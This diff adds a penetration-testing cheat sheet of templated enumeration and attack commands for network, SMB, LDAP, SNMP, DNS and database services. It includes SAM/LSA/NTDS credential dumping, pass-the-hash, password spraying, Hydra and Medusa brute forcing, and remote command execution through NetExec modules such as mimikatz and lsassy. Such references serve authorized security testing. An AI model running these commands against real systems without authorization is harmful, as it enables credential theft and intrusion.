@@ -1,0 +1,653 @@
+% network, enumeration, scanning
+
+; ============================================
+; NMAP - Network Scanner
+; ============================================
+
+# Nmap - Quick scan common ports
+nmap -sV -sC $IP
+
+# Nmap - Full TCP port scan
+nmap -p- -T4 $IP
+
+# Nmap - Top 1000 ports
+nmap --top-ports 1000 $IP
+
+# Nmap - UDP scan
+nmap -sU --top-ports 100 $IP
+
+# Nmap - Aggressive scan
+nmap -A -T4 $IP
+
+# Nmap - Stealth SYN scan
+nmap -sS $IP
+
+# Nmap - Version detection
+nmap -sV --version-intensity <intensity> $IP
+
+# Nmap - OS detection
+nmap -O $IP
+
+# Nmap - Script scan (default)
+nmap -sC $IP
+
+# Nmap - Specific script
+nmap --script <script_name> $IP
+
+# Nmap - Script categories
+nmap --script <category> $IP
+
+# Nmap - Vulnerability scan
+nmap --script vuln $IP
+
+# Nmap - SMB enumeration
+nmap --script smb-enum-* -p 445 $IP
+
+# Nmap - SMB vulnerabilities
+nmap --script smb-vuln-* -p 445 $IP
+
+# Nmap - HTTP enumeration
+nmap --script http-enum -p 80,443 $IP
+
+# Nmap - Subnet scan
+nmap -sn $SUBNET
+
+# Nmap - Output to all formats
+nmap -oA <output_prefix> $IP
+
+# Nmap - Output to XML
+nmap -oX <output_file> $IP
+
+# Nmap - Output to greppable
+nmap -oG <output_file> $IP
+
+# Nmap - Timing template
+nmap -T<timing> $IP
+
+# Nmap - Exclude hosts
+nmap $SUBNET --exclude <exclude_hosts>
+
+# Nmap - Scan from file
+nmap -iL <target_file>
+
+# Nmap - Traceroute
+nmap --traceroute $IP
+
+# Nmap - Reason for port state
+nmap --reason $IP
+
+# Nmap - Custom DNS servers
+nmap --dns-servers <dns_servers> $IP
+
+# Nmap - No DNS resolution
+nmap -n $IP
+
+$ intensity: echo -e "0\n5\n9"
+$ script_name: echo -e "smb-os-discovery\nsmb-enum-shares\nhttp-title\nssl-cert"
+$ category: echo -e "auth\nbroadcast\ndefault\ndiscovery\ndos\nexploit\nexternal\nfuzzer\nintrusive\nmalware\nsafe\nversion\nvuln"
+$ output_prefix: echo "nmap_scan"
+$ timing: echo -e "0\n1\n2\n3\n4\n5"
+$ exclude_hosts: echo "192.168.1.1,192.168.1.254"
+$ target_file: echo "targets.txt"
+$ dns_servers: echo "8.8.8.8,1.1.1.1"
+
+; ============================================
+; NETEXEC (NXC) - Previously CrackMapExec
+; ============================================
+
+# NXC - SMB authentication check
+nxc smb $IP -u $AD_USER -p <password>
+
+# NXC - SMB password spray
+nxc smb $SUBNET -u <user_file> -p <password>
+
+# NXC - SMB hash authentication
+nxc smb $IP -u $AD_USER -H <nthash>
+
+# NXC - SMB null session
+nxc smb $IP -u '' -p ''
+
+# NXC - SMB enumerate shares
+nxc smb $IP -u $AD_USER -p <password> --shares
+
+# NXC - SMB enumerate users
+nxc smb $IP -u $AD_USER -p <password> --users
+
+# NXC - SMB enumerate groups
+nxc smb $IP -u $AD_USER -p <password> --groups
+
+# NXC - SMB enumerate logged on users
+nxc smb $IP -u $AD_USER -p <password> --logged-on
+
+# NXC - SMB enumerate sessions
+nxc smb $IP -u $AD_USER -p <password> --sessions
+
+# NXC - SMB enumerate disks
+nxc smb $IP -u $AD_USER -p <password> --disks
+
+# NXC - SMB pass-the-hash
+nxc smb $IP -u $AD_USER -H <nthash>
+
+# NXC - SMB execute command
+nxc smb $IP -u $AD_USER -p <password> -x <command>
+
+# NXC - SMB execute PowerShell
+nxc smb $IP -u $AD_USER -p <password> -X <ps_command>
+
+# NXC - SMB dump SAM
+nxc smb $IP -u $AD_USER -p <password> --sam
+
+# NXC - SMB dump LSA
+nxc smb $IP -u $AD_USER -p <password> --lsa
+
+# NXC - SMB dump NTDS
+nxc smb $IP -u $AD_USER -p <password> --ntds
+
+# NXC - SMB spider shares
+nxc smb $IP -u $AD_USER -p <password> -M spider_plus
+
+# NXC - SMB enumerate with module
+nxc smb $IP -u $AD_USER -p <password> -M <module>
+
+# NXC - WinRM authentication check
+nxc winrm $IP -u $AD_USER -p <password>
+
+# NXC - WinRM execute command
+nxc winrm $IP -u $AD_USER -p <password> -x <command>
+
+# NXC - LDAP authentication
+nxc ldap $IP -u $AD_USER -p <password>
+
+# NXC - LDAP enumerate users
+nxc ldap $IP -u $AD_USER -p <password> --users
+
+# NXC - LDAP enumerate groups
+nxc ldap $IP -u $AD_USER -p <password> --groups
+
+# NXC - LDAP enumerate trusted domains
+nxc ldap $IP -u $AD_USER -p <password> --trusted-for-delegation
+
+# NXC - MSSQL authentication
+nxc mssql $IP -u <mssql_user> -p <password>
+
+# NXC - MSSQL execute query
+nxc mssql $IP -u <mssql_user> -p <password> -q '<query>'
+
+# NXC - MSSQL execute command (xp_cmdshell)
+nxc mssql $IP -u <mssql_user> -p <password> -x <command>
+
+# NXC - SSH authentication
+nxc ssh $IP -u <ssh_user> -p <password>
+
+# NXC - FTP authentication
+nxc ftp $IP -u <ftp_user> -p <password>
+
+# NXC - RDP authentication check
+nxc rdp $IP -u $AD_USER -p <password>
+
+# NXC - Subnet scan with credentials
+nxc smb $SUBNET -u $AD_USER -p <password>
+
+# NXC - Continue on success
+nxc smb $SUBNET -u $AD_USER -p <password> --continue-on-success
+
+# NXC - Local authentication
+nxc smb $IP -u $AD_USER -p <password> --local-auth
+
+$ user_file: echo "users.txt"
+$ module: echo -e "spider_plus\nmimikatz\nlsassy\nnanodump\nweb_delivery"
+$ ps_command: echo "Get-Process"
+$ mssql_user: echo "sa"
+$ ssh_user: echo "root"
+$ ftp_user: echo "anonymous"
+$ query: echo "SELECT @@version"
+
+; ============================================
+; ENUM4LINUX-NG
+; ============================================
+
+# Enum4linux-ng - Full enumeration
+enum4linux-ng $IP
+
+# Enum4linux-ng - With credentials
+enum4linux-ng -u $AD_USER -p <password> $IP
+
+# Enum4linux-ng - All enumeration
+enum4linux-ng -A $IP
+
+# Enum4linux-ng - Users only
+enum4linux-ng -U $IP
+
+# Enum4linux-ng - Groups only
+enum4linux-ng -G $IP
+
+# Enum4linux-ng - Shares only
+enum4linux-ng -S $IP
+
+# Enum4linux-ng - Policy information
+enum4linux-ng -P $IP
+
+# Enum4linux-ng - OS information
+enum4linux-ng -O $IP
+
+# Enum4linux-ng - JSON output
+enum4linux-ng -oJ <output_file> $IP
+
+# Enum4linux-ng - YAML output
+enum4linux-ng -oY <output_file> $IP
+
+; ============================================
+; MASSCAN - Fast Port Scanner
+; ============================================
+
+# Masscan - Fast scan all ports
+masscan -p0-65535 $IP --rate=<rate>
+
+# Masscan - Scan subnet
+masscan -p<ports> $SUBNET --rate=<rate>
+
+# Masscan - Top ports
+masscan -p80,443,8080,8443 $SUBNET --rate=<rate>
+
+# Masscan - Banner grabbing
+masscan -p<ports> $SUBNET --rate=<rate> --banners
+
+# Masscan - Output to file
+masscan -p<ports> $SUBNET --rate=<rate> -oL <output_file>
+
+# Masscan - Exclude hosts
+masscan -p<ports> $SUBNET --rate=<rate> --exclude <exclude_hosts>
+
+$ rate: echo -e "1000\n10000\n100000"
+$ ports: echo -e "80,443\n1-1000\n1-65535"
+
+; ============================================
+; SMBMAP
+; ============================================
+
+# SMBMap - List shares
+smbmap -H $IP
+
+# SMBMap - With credentials
+smbmap -H $IP -u $AD_USER -p <password>
+
+# SMBMap - With hash
+smbmap -H $IP -u $AD_USER -p <nthash>
+
+# SMBMap - Domain authentication
+smbmap -H $IP -u $AD_USER -p <password> -d $DOMAIN
+
+# SMBMap - Recursive listing
+smbmap -H $IP -u $AD_USER -p <password> -r
+
+# SMBMap - Download file
+smbmap -H $IP -u $AD_USER -p <password> --download '<share>/<file>'
+
+# SMBMap - Upload file
+smbmap -H $IP -u $AD_USER -p <password> --upload '<local_file>' '<share>/<remote_file>'
+
+# SMBMap - Execute command
+smbmap -H $IP -u $AD_USER -p <password> -x <command>
+
+# SMBMap - List all drives
+smbmap -H $IP -u $AD_USER -p <password> -L
+
+$ share: echo -e "C$\nADMIN$\nSYSVOL\nNETLOGON"
+$ file: echo "file.txt"
+$ remote_file: echo "uploaded.exe"
+
+; ============================================
+; SMBCLIENT
+; ============================================
+
+# SMBClient - List shares
+smbclient -L //$IP -U $AD_USER
+
+# SMBClient - Connect to share
+smbclient //$IP/<share> -U $AD_USER
+
+# SMBClient - Null session
+smbclient -L //$IP -N
+
+# SMBClient - Execute command
+smbclient //$IP/<share> -U $AD_USER -c '<smb_command>'
+
+# SMBClient - Kerberos authentication
+smbclient //$IP/<share> -k
+
+$ smb_command: echo -e "ls\nget file.txt\nput file.txt"
+
+; ============================================
+; RPCCLIENT
+; ============================================
+
+# RPCClient - Connect with credentials
+rpcclient -U $AD_USER $IP
+
+# RPCClient - Null session
+rpcclient -U "" -N $IP
+
+# RPCClient - Execute command
+rpcclient -U $AD_USER -c '<rpc_command>' $IP
+
+# RPCClient - Enumerate users
+rpcclient -U $AD_USER -c 'enumdomusers' $IP
+
+# RPCClient - Enumerate groups
+rpcclient -U $AD_USER -c 'enumdomgroups' $IP
+
+# RPCClient - Query user
+rpcclient -U $AD_USER -c 'queryuser <rid>' $IP
+
+# RPCClient - Query group
+rpcclient -U $AD_USER -c 'querygroup <rid>' $IP
+
+$ rpc_command: echo -e "enumdomusers\nenumdomgroups\nquerydispinfo\ngetdompwinfo"
+
+; ============================================
+; LDAPSEARCH
+; ============================================
+
+# LDAPSearch - Basic search
+ldapsearch -x -H ldap://$IP -b "dc=<dc1>,dc=<dc2>"
+
+# LDAPSearch - With credentials
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>"
+
+# LDAPSearch - All users
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(objectClass=user)"
+
+# LDAPSearch - All groups
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(objectClass=group)"
+
+# LDAPSearch - All computers
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(objectClass=computer)"
+
+# LDAPSearch - Service Principal Names
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "servicePrincipalName=*" servicePrincipalName
+
+# LDAPSearch - Find admin accounts
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(adminCount=1)"
+
+# LDAPSearch - Password not required
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
+
+# LDAPSearch - Kerberos pre-auth not required
+ldapsearch -x -H ldap://$IP -D "$AD_TARGET" -w <password> -b "dc=<dc1>,dc=<dc2>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+
+$ dc1: echo "domain"
+$ dc2: echo "local"
+
+; ============================================
+; ONESIXTYONE - SNMP Scanner
+; ============================================
+
+# Onesixtyone - Scan single host
+onesixtyone $IP
+
+# Onesixtyone - Scan with community string
+onesixtyone $IP <community>
+
+# Onesixtyone - Scan subnet
+onesixtyone $SUBNET
+
+# Onesixtyone - Use community file
+onesixtyone -c <community_file> $IP
+
+# Onesixtyone - Scan from hosts file
+onesixtyone -i <hosts_file>
+
+$ community: echo -e "public\nprivate\nmanager"
+$ community_file: echo "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
+$ hosts_file: echo "hosts.txt"
+
+; ============================================
+; SNMPWALK
+; ============================================
+
+# SNMPWalk - Walk MIB tree
+snmpwalk -v <version> -c <community> $IP
+
+# SNMPWalk - Specific OID
+snmpwalk -v <version> -c <community> $IP <oid>
+
+# SNMPWalk - System information
+snmpwalk -v <version> -c <community> $IP 1.3.6.1.2.1.1
+
+# SNMPWalk - Processes
+snmpwalk -v <version> -c <community> $IP 1.3.6.1.2.1.25.4.2.1.2
+
+# SNMPWalk - Users
+snmpwalk -v <version> -c <community> $IP 1.3.6.1.4.1.77.1.2.25
+
+# SNMPWalk - Network interfaces
+snmpwalk -v <version> -c <community> $IP 1.3.6.1.2.1.2.2.1.2
+
+$ version: echo -e "1\n2c\n3"
+$ oid: echo -e "1.3.6.1.2.1.1\n1.3.6.1.2.1.25.4.2.1.2"
+
+; ============================================
+; DIG - DNS Queries
+; ============================================
+
+# Dig - Basic query
+dig @$IP $DOMAIN
+
+# Dig - Specific record type
+dig @$IP $DOMAIN <record_type>
+
+# Dig - Zone transfer
+dig @$IP $DOMAIN axfr
+
+# Dig - Reverse lookup
+dig @$IP -x $IP
+
+# Dig - Short output
+dig @$IP $DOMAIN +short
+
+# Dig - Trace query path
+dig @$IP $DOMAIN +trace
+
+$ record_type: echo -e "A\nAAAA\nMX\nNS\nTXT\nCNAME\nSOA\nSRV"
+
+; ============================================
+; DNSENUM
+; ============================================
+
+# DNSenum - Basic enumeration
+dnsenum $DOMAIN
+
+# DNSenum - Specific DNS server
+dnsenum --dnsserver $IP $DOMAIN
+
+# DNSenum - With zone transfer
+dnsenum --enum $DOMAIN
+
+# DNSenum - Brute force subdomains
+dnsenum -f <subdomain_list> $DOMAIN
+
+# DNSenum - Output to file
+dnsenum -o <output_file> $DOMAIN
+
+$ subdomain_list: echo "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+
+; ============================================
+; FIERCE - DNS Reconnaissance
+; ============================================
+
+# Fierce - Basic scan
+fierce --domain $DOMAIN
+
+# Fierce - Specific DNS server
+fierce --domain $DOMAIN --dns-servers $IP
+
+# Fierce - Custom subdomain wordlist
+fierce --domain $DOMAIN --subdomain-file <subdomain_list>
+
+; ============================================
+; NBTSCAN - NetBIOS Scanner
+; ============================================
+
+# NBTScan - Scan single host
+nbtscan $IP
+
+# NBTScan - Scan subnet
+nbtscan $SUBNET
+
+# NBTScan - Verbose output
+nbtscan -v $IP
+
+; ============================================
+; NIKTO - Web Server Scanner (see web-tools.cheat)
+; ============================================
+
+; ============================================
+; REDIS-CLI - Redis Database
+; ============================================
+
+# Redis-CLI - Connect to Redis
+redis-cli -h $IP
+
+# Redis-CLI - With authentication
+redis-cli -h $IP -a <redis_password>
+
+# Redis-CLI - Execute command
+redis-cli -h $IP <redis_command>
+
+# Redis-CLI - Get all keys
+redis-cli -h $IP KEYS '*'
+
+# Redis-CLI - Get server info
+redis-cli -h $IP INFO
+
+$ redis_password: echo "password"
+$ redis_command: echo -e "INFO\nKEYS *\nCONFIG GET *"
+
+; ============================================
+; MYSQL - Database Client
+; ============================================
+
+# MySQL - Connect to database
+mysql -h $IP -u <mysql_user> -p
+
+# MySQL - Connect with password
+mysql -h $IP -u <mysql_user> -p<password>
+
+# MySQL - Execute query
+mysql -h $IP -u <mysql_user> -p<password> -e '<mysql_query>'
+
+$ mysql_user: echo "root"
+$ mysql_query: echo -e "SHOW DATABASES;\nSELECT user,host FROM mysql.user;"
+
+; ============================================
+; POSTGRESQL - Database Client
+; ============================================
+
+# PostgreSQL - Connect to database
+psql -h $IP -U <postgres_user>
+
+# PostgreSQL - Connect to specific database
+psql -h $IP -U <postgres_user> -d <database>
+
+# PostgreSQL - Execute query
+psql -h $IP -U <postgres_user> -c '<postgres_query>'
+
+$ postgres_user: echo "postgres"
+$ database: echo "postgres"
+$ postgres_query: echo -e "\\l\n\\du\nSELECT version();"
+
+; ============================================
+; TELNET - Network Protocol
+; ============================================
+
+# Telnet - Connect to host
+telnet $IP <port>
+
+# Telnet - Banner grabbing
+echo "QUIT" | telnet $IP <port>
+
+; ============================================
+; NC (Netcat) - Network Utility
+; ============================================
+
+# Netcat - Banner grabbing
+nc -nv $IP <port>
+
+# Netcat - Listen on port
+nc -nlvp <port>
+
+# Netcat - Connect with timeout
+nc -w <timeout> $IP <port>
+
+# Netcat - UDP connection
+nc -u $IP <port>
+
+# Netcat - Transfer file
+nc -nlvp <port> > <output_file>
+
+$ timeout: echo -e "5\n10\n30"
+
+; ============================================
+; HYDRA - Password Cracker
+; ============================================
+
+# Hydra - SSH brute force
+hydra -l <username> -P <password_list> ssh://$IP
+
+# Hydra - FTP brute force
+hydra -l <username> -P <password_list> ftp://$IP
+
+# Hydra - SMB brute force
+hydra -l <username> -P <password_list> smb://$IP
+
+# Hydra - RDP brute force
+hydra -l <username> -P <password_list> rdp://$IP
+
+# Hydra - HTTP POST form
+hydra -l <username> -P <password_list> $WEB_TARGET http-post-form "<login_path>:<form_params>:<failure_string>"
+
+# Hydra - HTTP Basic Auth
+hydra -l <username> -P <password_list> $WEB_TARGET http-get
+
+# Hydra - Multiple threads
+hydra -l <username> -P <password_list> -t <threads> ssh://$IP
+
+# Hydra - Continue on success
+hydra -l <username> -P <password_list> -f ssh://$IP
+
+$ password_list: find /usr/share/wordlists -type f -name "*.txt" 2>/dev/null | head -10
+$ login_path: echo "/login.php"
+$ form_params: echo "username=^USER^&password=^PASS^"
+$ failure_string: echo "Login failed"
+
+; ============================================
+; MEDUSA - Password Cracker
+; ============================================
+
+# Medusa - SSH brute force
+medusa -h $IP -u <username> -P <password_list> -M ssh
+
+# Medusa - FTP brute force
+medusa -h $IP -u <username> -P <password_list> -M ftp
+
+# Medusa - SMB brute force
+medusa -h $IP -u <username> -P <password_list> -M smbnt
+
+# Medusa - Multiple threads
+medusa -h $IP -u <username> -P <password_list> -M ssh -t <threads>
+
+; ============================================
+; METASPLOIT AUXILIARY MODULES (via msfconsole)
+; ============================================
+
+# MSF - SMB version scan
+msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS $IP; run; exit"
+
+# MSF - SMB enumeration
+msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $IP; run; exit"
+
+# MSF - SSH version scan
+msfconsole -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS $IP; run; exit"
+
+# MSF - FTP version scan
+msfconsole -x "use auxiliary/scanner/ftp/ftp_version; set RHOSTS $IP; run; exit"
